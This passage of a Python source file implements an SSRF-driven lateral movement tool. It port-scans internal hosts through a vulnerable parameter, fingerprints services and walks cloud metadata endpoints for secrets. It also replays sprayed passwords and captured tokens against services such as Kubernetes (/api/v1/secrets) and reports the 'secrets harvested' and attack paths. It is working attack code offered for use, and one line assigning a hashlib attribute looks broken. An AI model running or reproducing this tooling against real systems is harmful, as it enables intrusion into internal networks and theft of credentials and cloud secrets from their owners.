            if service_type == ServiceType.GRAFANA:
                url = f"{base}/api/health"
            else:
                url = f"{base}/api/json"
            orig = dict(vector.extra_headers)
            import base64
            vector.extra_headers["Authorization"] = "Basic " + base64.b64encode(f"{u}:{p}".encode()).decode()
            status, body, _ = await _ssrf_fetch(session, url, vector, delay=delay, proxy=proxy)
            vector.extra_headers = orig
            if status == 200:
                hits.append(f"{service_type.value}:{u}:{p}")

    if service_type == ServiceType.KUBERNETES_API:
        for cred in credentials[:3]:
            token = cred.get("token", cred.get("password", ""))
            if not token:
                continue
            orig = dict(vector.extra_headers)
            vector.extra_headers["Authorization"] = f"Bearer {token}"
            url = f"{base}/api/v1/secrets"
            status, body, _ = await _ssrf_fetch(session, url, vector, delay=delay, proxy=proxy)
            vector.extra_headers = orig
            if status == 200 and "SecretList" in body:
                hits.append(f"k8s_bearer_token:{token[:20]}...")

    return hits


# ─── Internal API Walker ──────────────────────────────────────────────────────

async def _walk_internal_api(
    session: aiohttp.ClientSession,
    host: str,
    port: int,
    service_type: ServiceType,
    vector: SSRFVector,
    delay: float = 0.2,
    proxy: Optional[str] = None,
) -> list[str]:
    discovered: list[str] = []
    scheme = "https" if port in (443, 8443, 6443, 2376) else "http"
    base = f"{scheme}://{host}:{port}"
    link_pattern = re.compile(r'href=["\']([^"\'#?]+)["\']|"((?:/[a-zA-Z0-9_/-]+){2,})"', re.IGNORECASE)

    root_status, root_body, _ = await _ssrf_fetch(session, base + "/", vector, delay=delay, proxy=proxy)
    if root_status not in (200, 201, 400, 401, 403):
        return discovered

    for m in link_pattern.finditer(root_body):
        href = m.group(1) or m.group(2)
        if href and href.startswith("/"):
            discovered.append(base + href[:100])

    if service_type == ServiceType.KUBERNETES_API:
        status, body, _ = await _ssrf_fetch(session, base + "/api/v1", vector, delay=delay, proxy=proxy)
        if status == 200:
            resource_pattern = re.compile(r'"name"\s*:\s*"([a-z]+)"')
            for m in resource_pattern.finditer(body):
                resource = m.group(1)
                discovered.append(f"{base}/api/v1/{resource}")

    if service_type == ServiceType.CONSUL:
        status, body, _ = await _ssrf_fetch(session, base + "/v1/catalog/services", vector, delay=delay, proxy=proxy)
        if status == 200:
            svc_pattern = re.compile(r'"([a-zA-Z0-9_-]+)"\s*:\s*\[')
            for m in svc_pattern.finditer(body):
                svc_name = m.group(1)
                discovered.append(f"{base}/v1/health/service/{svc_name}")

    if service_type == ServiceType.ELASTICSEARCH:
        status, body, _ = await _ssrf_fetch(session, base + "/_cat/indices?v", vector, delay=delay, proxy=proxy)
        if status == 200:
            index_pattern = re.compile(r'\s+([a-zA-Z0-9_.-]+)\s+')
            for m in index_pattern.finditer(body):
                idx = m.group(1)
                if not idx.startswith("."):
                    discovered.append(f"{base}/{idx}/_search?size=5")

    return list(set(discovered))[:20]


# ─── Topology Builder ─────────────────────────────────────────────────────────

def _infer_node_role(services: dict[int, ServiceFingerprint]) -> NodeRole:
    role_priority = [
        NodeRole.SECRET_STORE,
        NodeRole.ORCHESTRATOR,
        NodeRole.DATABASE,
        NodeRole.IDENTITY_STORE,
        NodeRole.CI_CD,
        NodeRole.MESSAGE_QUEUE,
        NodeRole.MONITORING,
        NodeRole.CACHE,
        NodeRole.GATEWAY,
    ]
    role_counts: dict[NodeRole, int] = {}
    for fp in services.values():
        role = NODE_ROLE_MAP.get(fp.service_type, NodeRole.UNKNOWN)
        role_counts[role] = role_counts.get(role, 0) + 1
    for role in role_priority:
        if role_counts.get(role, 0) > 0:
            return role
    return NodeRole.UNKNOWN


def _infer_host_risk(services: dict[int, ServiceFingerprint]) -> HostRisk:
    if not services:
        return HostRisk.LOW
    highest = HostRisk.LOW
    tier = {HostRisk.CRITICAL: 4, HostRisk.HIGH: 3, HostRisk.MEDIUM: 2, HostRisk.LOW: 1}
    for fp in services.values():
        risk = RISK_MAP.get(fp.service_type, HostRisk.LOW)
        if tier[risk] > tier[highest]:
            highest = risk
        if fp.unauthenticated_data or not fp.auth_required:
            if tier[HostRisk.HIGH] > tier[highest]:
                highest = HostRisk.HIGH
    return highest


def _build_topology(
    hosts: dict[str, InternalHost],
    target_url: str,
) -> InternalTopology:
    edges: list[TopologyEdge] = []
    entry_points: list[str] = []
    high_value: list[str] = []
    target_host = urlparse(target_url).netloc

    for host_id, host in hosts.items():
        if host.node_role == NodeRole.GATEWAY or target_host in host.address:
            entry_points.append(host_id)
        if host.risk in (HostRisk.CRITICAL, HostRisk.HIGH):
            high_value.append(host_id)
        for via in host.reachable_via:
            edges.append(TopologyEdge(
                source=via,
                target=host_id,
                edge_type="ssrf_pivot",
                technique=LateralTechnique.SSRF_SERVICE_PROBE,
                confidence=0.9,
                pivot_payload=f"SSRF → {host.address}",
            ))

    chains: list[list[str]] = []
    for ep in entry_points:
        for hv in high_value:
            if ep != hv:
                chains.append([ep, hv])

    if not entry_points:
        entry_points = list(hosts.keys())[:1]

    return InternalTopology(
        nodes=hosts,
        edges=edges,
        entry_points=entry_points,
        high_value_targets=high_value,
        pivot_chains=chains[:10],
    )


def _build_attack_paths(topology: InternalTopology) -> list[dict]:
    paths: list[dict] = []
    for chain in topology.pivot_chains[:10]:
        if len(chain) < 2:
            continue
        src_id = chain[0]
        dst_id = chain[-1]
        src = topology.nodes.get(src_id)
        dst = topology.nodes.get(dst_id)
        if not src or not dst:
            continue
        dst_services = list(dst.services.values())
        dst_service = dst_services[0] if dst_services else None
        paths.append({
            "path_id": f"PATH-{src_id[:4]}-{dst_id[:4]}",
            "entry": src.address,
            "target": dst.address,
            "target_role": dst.node_role.value,
            "target_risk": dst.risk.value,
            "technique": LateralTechnique.SSRF_SERVICE_PROBE.value,
            "exploit_hints": dst_service.exploit_hints[:3] if dst_service else [],
            "sensitive_data_found": dst.secrets_found[:5],
            "credentials_work": dst.credentials_tried[:3],
        })
    return paths


# ─── Lateral Mover Core ───────────────────────────────────────────────────────

class AILateralMover:
    def __init__(
        self,
        target_url: str,
        scan_results: dict,
        port_scan_concurrency: int = 15,
        service_probe_concurrency: int = 5,
        delay: float = 0.15,
        timeout: int = 10,
        proxy: Optional[str] = None,
        fast_mode: bool = False,
    ):
        self.target_url = target_url
        self.scan_results = scan_results
        self.port_scan_concurrency = port_scan_concurrency
        self.service_probe_concurrency = service_probe_concurrency
        self.delay = delay
        self.timeout = timeout
        self.proxy = proxy
        self.fast_mode = fast_mode
        self.move_id = f"LAT-{uuid.uuid4().hex[:8].upper()}"
        self._start: float = 0.0
        self._hosts: dict[str, InternalHost] = {}

    def _build_ssrf_vectors(self) -> list[SSRFVector]:
        vectors: list[SSRFVector] = []
        ssrf = self.scan_results.get("ssrf_probe", {})
        for finding in ssrf.get("findings", []):
            if finding.get("severity") not in ("critical", "high", "medium"):
                continue
            param = finding.get("param", "url")
            endpoint = finding.get("endpoint", self.target_url)
            if not endpoint:
                endpoint = self.target_url
            vectors.append(SSRFVector(
                endpoint=endpoint,
                param=param,
                method="GET",
                inject_style="query_param",
            ))
        redirect = self.scan_results.get("redirect_trace", {})
        for finding in redirect.get("findings", []):
            if finding.get("type") == "open_redirect":
                param = finding.get("param", "next")
                url = finding.get("url", self.target_url)
                vectors.append(SSRFVector(
                    endpoint=url,
                    param=param,
                    method="GET",
                    inject_style="query_param",
                ))
        headers_result = self.scan_results.get("header_injection", {})
        for finding in headers_result.get("findings", []):
            if finding.get("severity") in ("high", "critical"):
                header_name = finding.get("header", "X-Forwarded-For")
                vectors.append(SSRFVector(
                    endpoint=self.target_url,
                    param=header_name,
                    method="GET",
                    inject_style="header",
                ))
        if not vectors:
            vectors.append(SSRFVector(
                endpoint=self.target_url,
                param="url",
                method="GET",
                inject_style="query_param",
            ))
        return vectors[:5]

    def _collect_target_hosts(self) -> list[str]:
        hosts: set[str] = set()
        ssrf = self.scan_results.get("ssrf_probe", {})
        for finding in ssrf.get("findings", []):
            target = finding.get("payload_target", "")
            parsed = urlparse(target)
            if parsed.hostname:
                hosts.add(parsed.hostname)
        session = self.scan_results.get("session_manager", {})
        for pivot in session.get("pivots", []):
            parsed = urlparse(pivot)
            if parsed.hostname:
                hosts.add(parsed.hostname)
        for ip in INTERNAL_HOST_RANGES:
            hosts.add(ip)
        scorer = self.scan_results.get("vuln_score", {})
        for finding in scorer.get("top_findings", []):
            url = finding.get("affected_url", "")
            parsed = urlparse(url)
            if parsed.hostname and parsed.hostname not in urlparse(self.target_url).netloc:
                hosts.add(parsed.hostname)
        return list(hosts)[:20]

    def _collect_credentials(self) -> list[dict]:
        creds: list[dict] = []
        spray = self.scan_results.get("credential_spray", {})
        for hit in spray.get("successful_logins", []):
            creds.append({"username": hit.get("username", ""), "password": hit.get("password", "")})
        js = self.scan_results.get("js_secrets", {})
        for secret in js.get("secrets", []):
            stype = secret.get("secret_type", "").lower()
            if any(k in stype for k in ("token", "bearer", "jwt")):
                creds.append({"token": secret.get("match_preview", "")})
        session = self.scan_results.get("session_manager", {})
        for tok in session.get("token_captures", []):
            if tok.get("type") in ("jwt", "bearer"):
                creds.append({"token": tok.get("value", "")})
        return creds[:10]

    def _select_ports(self) -> list[int]:
        if self.fast_mode:
            return [p for p in COMMON_INTERNAL_PORTS if p in HIGH_VALUE_PORTS]
        return COMMON_INTERNAL_PORTS

    async def _process_host(
        self,
        session: aiohttp.ClientSession,
        host: str,
        vectors: list[SSRFVector],
        credentials: list[dict],
    ) -> Optional[InternalHost]:
        if not vectors:
            return None
        vector = vectors[0]
        ports = self._select_ports()
        open_ports = await _port_scan_host(
            session, host, ports, vector,
            concurrency=self.port_scan_concurrency,
            delay=self.delay,
            proxy=self.proxy,
        )
        if not open_ports:
            return None

        host_id = hashlib.md5_port_hash = f"HOST-{host.replace('.', '_').replace(':', '_')}"
        services: dict[int, ServiceFingerprint] = {}
        all_secrets: list[str] = []

        fp_sem = asyncio.Semaphore(self.service_probe_concurrency)

        async def fingerprint_one(pr: PortResult) -> None:
            async with fp_sem:
                stype = _detect_service_type(pr.port, pr.banner)
                fp = await _fingerprint_service(
                    session, host, pr.port, stype, vector,
                    delay=self.delay, proxy=self.proxy,
                )
                services[pr.port] = fp
                all_secrets.extend(fp.unauthenticated_data)

        await asyncio.gather(*[fingerprint_one(pr) for pr in open_ports], return_exceptions=True)

        cred_hits: list[str] = []
        if credentials:
            cred_sem = asyncio.Semaphore(3)

            async def try_creds(pr: PortResult) -> list[str]:
                async with cred_sem:
                    stype = services.get(pr.port, ServiceFingerprint(
                        service_type=ServiceType.UNKNOWN, version_hint="",
                        auth_required=True, admin_exposed=False,
                        unauthenticated_data=[], sensitive_endpoints=[],
                        exploit_hints=[], raw_response_snippet="",
                    )).service_type
                    return await _attempt_cred_reuse(
                        session, host, pr.port, stype, credentials, vector,
                        delay=self.delay, proxy=self.proxy,
                    )

            cred_results = await asyncio.gather(*[try_creds(pr) for pr in open_ports], return_exceptions=True)
            for r in cred_results:
                if isinstance(r, list):
                    cred_hits.extend(r)

        pivot_paths: list[str] = []
        for pr in open_ports[:3]:
            stype = services.get(pr.port, ServiceFingerprint(
                service_type=ServiceType.UNKNOWN_HTTP, version_hint="",
                auth_required=False, admin_exposed=False,
                unauthenticated_data=[], sensitive_endpoints=[],
                exploit_hints=[], raw_response_snippet="",
            )).service_type
            discovered = await _walk_internal_api(
                session, host, pr.port, stype, vector,
                delay=self.delay, proxy=self.proxy,
            )
            pivot_paths.extend(discovered)

        node_role = _infer_node_role(services)
        risk = _infer_host_risk(services)

        hostname_match = re.search(r'hostname["\s:]+([a-zA-Z0-9._-]+)', " ".join(
            fp.raw_response_snippet for fp in services.values()
        ))
        hostname = hostname_match.group(1) if hostname_match else host

        return InternalHost(
            host_id=host_id,
            address=host,
            hostname=hostname,
            open_ports=open_ports,
            services=services,
            node_role=node_role,
            risk=risk,
            reachable_via=[vector.endpoint],
            credentials_tried=cred_hits,
            secrets_found=list(set(all_secrets)),
            pivot_paths=list(set(pivot_paths))[:15],
            discovery_technique=LateralTechnique.SSRF_PORT_SCAN,
        )

    async def _run_cloud_metadata(
        self,
        session: aiohttp.ClientSession,
        vectors: list[SSRFVector],
    ) -> Optional[InternalHost]:
        if not vectors:
            return None
        vector = vectors[0]
        cloud_data = await _walk_cloud_metadata(session, vector, delay=self.delay, proxy=self.proxy)
        if not cloud_data:
            return None

        secrets: list[str] = []
        for provider, data in cloud_data.items():
            for k, v in data.items():
                if k.startswith("__extracted"):
                    secrets.append(f"{provider}:{k}={v[:40]}")

        cloud_host = InternalHost(
            host_id="HOST-CLOUD_METADATA",
            address="169.254.169.254",
            hostname="cloud-metadata-service",
            open_ports=[],
            services={},
            node_role=NodeRole.CLOUD_METADATA,
            risk=HostRisk.CRITICAL,
            reachable_via=[vector.endpoint],
            credentials_tried=[],
            secrets_found=secrets,
            pivot_paths=[ep for provider_data in cloud_data.values() for ep in list(provider_data.keys())[:5]],
            discovery_technique=LateralTechnique.CLOUD_METADATA_WALK,
        )
        self.scan_results["cloud_metadata_walk"] = cloud_data
        return cloud_host

    async def run(self) -> LateralMoveReport:
        self._start = time.monotonic()
        vectors = self._build_ssrf_vectors()
        target_hosts = self._collect_target_hosts()
        credentials = self._collect_credentials()

        connector = aiohttp.TCPConnector(ssl=False, limit=30)
        async with aiohttp.ClientSession(connector=connector) as session:
            cloud_host = await self._run_cloud_metadata(session, vectors)
            if cloud_host:
                self._hosts[cloud_host.host_id] = cloud_host

            host_sem = asyncio.Semaphore(5)

            async def process_one(host: str) -> None:
                async with host_sem:
                    result = await self._process_host(session, host, vectors, credentials)
                    if result:
                        self._hosts[result.host_id] = result

            await asyncio.gather(*[process_one(h) for h in target_hosts], return_exceptions=True)

        topology = _build_topology(self._hosts, self.target_url)
        attack_paths = _build_attack_paths(topology)

        all_secrets = [s for host in self._hosts.values() for s in host.secrets_found]
        all_creds = [c for host in self._hosts.values() for c in host.credentials_tried]
        ssrf_params = list({v.param for v in vectors})
        techniques = list({host.discovery_technique for host in self._hosts.values()})

        reach_tiers = {HostRisk.CRITICAL: 0, HostRisk.HIGH: 0, HostRisk.MEDIUM: 0, HostRisk.LOW: 0}
        for host in self._hosts.values():
            reach_tiers[host.risk] += 1
        if reach_tiers[HostRisk.CRITICAL] > 0:
            overall_reach = "CRITICAL"
        elif reach_tiers[HostRisk.HIGH] > 0:
            overall_reach = "HIGH"
        elif reach_tiers[HostRisk.MEDIUM] > 0:
            overall_reach = "MEDIUM"
        else:
            overall_reach = "LOW"

        return LateralMoveReport(
            move_id=self.move_id,
            target_url=self.target_url,
            technique_used=techniques,
            hosts_discovered=len(self._hosts),
            topology=topology,
            ssrf_params_used=ssrf_params,
            credentials_reused=list(set(all_creds)),
            secrets_harvested=list(set(all_secrets)),
            attack_paths=attack_paths,
            overall_reach=overall_reach,
            duration_seconds=round(time.monotonic() - self._start, 2),
        )


# ─── Serializer ───────────────────────────────────────────────────────────────

def serialize_report(report: LateralMoveReport) -> dict:
    def port_to_dict(p: PortResult) -> dict:
        return {
            "host": p.host, "port": p.port, "state": p.state.value,
            "banner": p.banner[:100], "response_time_ms": p.response_time_ms,
            "technique": p.technique.value, "ssrf_param": p.ssrf_param,
        }

    def fp_to_dict(fp: ServiceFingerprint) -> dict:
        return {
            "service_type": fp.service_type.value,
            "version_hint": fp.version_hint,
            "auth_required": fp.auth_required,
            "admin_exposed": fp.admin_exposed,
            "unauthenticated_data": fp.unauthenticated_data,
            "sensitive_endpoints": fp.sensitive_endpoints,
            "exploit_hints": fp.exploit_hints[:3],
        }

    def host_to_dict(h: InternalHost) -> dict:
        return {
            "host_id": h.host_id,
            "address": h.address,
            "hostname": h.hostname,
            "node_role": h.node_role.value,
            "risk": h.risk.value,
            "open_ports": [port_to_dict(p) for p in h.open_ports],
            "services": {str(port): fp_to_dict(fp) for port, fp in h.services.items()},
            "reachable_via": h.reachable_via,
            "credentials_tried": h.credentials_tried,
            "secrets_found": h.secrets_found,
            "pivot_paths": h.pivot_paths[:10],
            "discovery_technique": h.discovery_technique.value,
        }

    def edge_to_dict(e: TopologyEdge) -> dict:
        return {
            "source": e.source, "target": e.target,
            "edge_type": e.edge_type, "technique": e.technique.value,
            "confidence": e.confidence,
        }

    topo = report.topology
    return {
        "move_id": report.move_id,
        "target": report.target_url,
        "overall_reach": report.overall_reach,
        "hosts_discovered": report.hosts_discovered,
        "duration_seconds": report.duration_seconds,
        "techniques_used": [t.value for t in report.technique_used],
        "ssrf_params_used": report.ssrf_params_used,
        "credentials_reused": report.credentials_reused,
        "secrets_harvested": report.secrets_harvested,
        "attack_paths": report.attack_paths,
        "topology": {
            "nodes": {hid: host_to_dict(h) for hid, h in topo.nodes.items()},
            "edges": [edge_to_dict(e) for e in topo.edges],
            "entry_points": topo.entry_points,
            "high_value_targets": topo.high_value_targets,
            "pivot_chains": topo.pivot_chains,
        },
    }


# ─── Public Entry Point ───────────────────────────────────────────────────────

def run_lateral_mover(
    target_url: str,
    scan_results: dict,
    port_scan_concurrency: int = 15,
    service_probe_concurrency: int = 5,
    delay: float = 0.15,
    timeout: int = 10,
    proxy: Optional[str] = None,
    fast_mode: bool = False,
) -> dict:
    mover = AILateralMover(
        target_url=target_url,
        scan_results=scan_results,
        port_scan_concurrency=port_scan_concurrency,
        service_probe_concurrency=service_probe_concurrency,
        delay=delay,
        timeout=timeout,
        proxy=proxy,
        fast_mode=fast_mode,
    )
    return serialize_report(asyncio.run(mover.run()))